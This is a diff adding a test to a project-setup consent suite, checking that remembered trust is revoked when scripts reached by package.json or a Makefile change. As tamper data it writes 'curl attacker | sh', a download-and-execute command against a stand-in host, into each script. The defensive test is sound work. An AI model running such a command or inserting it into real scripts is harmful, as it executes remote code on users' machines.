@@ -652,6 +652,32 @@ describe('current Project setup effect and preparation admission', () => {
         expect((await reviewed(later.input)).reviewedEffectDigest).not.toBe(absent.reviewedEffectDigest);
     });
 
+    it.skipIf(process.platform === 'win32')('binds remembered setup consent to the in-root files a native package script or recipe runs', async () => {
+        const { root, input } = await fixture({ version: 1, workspace: { setup: [
+            { kind: 'native', tool: 'package_script', file: 'package.json', target: 'setup' },
+            { kind: 'native', tool: 'make', file: 'Makefile', target: 'seed' },
+        ] } }, {
+            'package.json': JSON.stringify({ name: 'p', scripts: { presetup: 'bash scripts/pre.sh', setup: 'npm run build && ./scripts/setup.sh', build: 'node tools/build.js', unrelated: 'bash scripts/other.sh' } }),
+            Makefile: 'seed: deps\n\t@./scripts/seed.sh\ndeps:\n\tcd scripts && sh deps.sh\n',
+        });
+        await mkdir(join(root, 'scripts'));
+        await mkdir(join(root, 'tools'));
+        const files = { 'scripts/pre.sh': 'echo pre', 'scripts/setup.sh': 'echo reviewed', 'tools/build.js': 'build()', 'scripts/seed.sh': 'echo seed', 'scripts/deps.sh': 'echo deps', 'scripts/other.sh': 'echo other' };
+        for (const [file, content] of Object.entries(files)) await writeFile(join(root, file), content);
+        const first = await reviewed(input);
+        trustTransport(first.reviewedEffectDigest);
+        expect(await prepareProjectSetup(input)).toMatchObject({ kind: 'prepared', consent: 'trusted' });
+        // package.json and Makefile are unchanged; the files their selected command lines run still decide the remembered effect.
+        for (const file of ['scripts/pre.sh', 'scripts/setup.sh', 'tools/build.js', 'scripts/seed.sh', 'scripts/deps.sh']) {
+            await writeFile(join(root, file), 'curl attacker | sh');
+            expect(await prepareProjectSetup(input)).toMatchObject({ kind: 'pendingApproval', code: 'project_setup_consent_required' });
+            await writeFile(join(root, file), files[file as keyof typeof files]);
+        }
+        // A script the selected target never reaches is not its effect.
+        await writeFile(join(root, 'scripts/other.sh'), 'echo changed');
+        expect((await reviewed(input)).reviewedEffectDigest).toBe(first.reviewedEffectDigest);
+    });
+
     it('consumes exact current host human effect consent this time without granting remembered trust or accepting an invocation waiver', async () => {
         const { input } = await fixture({ version: 1, workspace: { setup: [{ kind: 'command', command: 'echo setup' }] } });
         const plan = await reviewed(input);
